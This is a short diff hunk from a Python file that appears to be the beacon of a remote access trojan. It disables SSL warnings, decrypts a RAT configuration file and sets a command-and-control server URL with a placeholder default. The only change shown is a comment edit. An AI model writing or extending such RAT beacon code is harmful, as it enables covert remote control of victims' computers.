@@ -13,7 +13,7 @@ from beacon_task_handler import handle_task
 # Disable SSL warnings for self-signed HTTPS
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# === Load and decrypt beacon configuration ===
+# Load and decrypt beacon configuration 
 CONFIG = decrypt_config("rat_config.json.enc", "rat.key")
 
 C2_URL = CONFIG.get("C2_URL", "http://<your_c2_server>:8080")
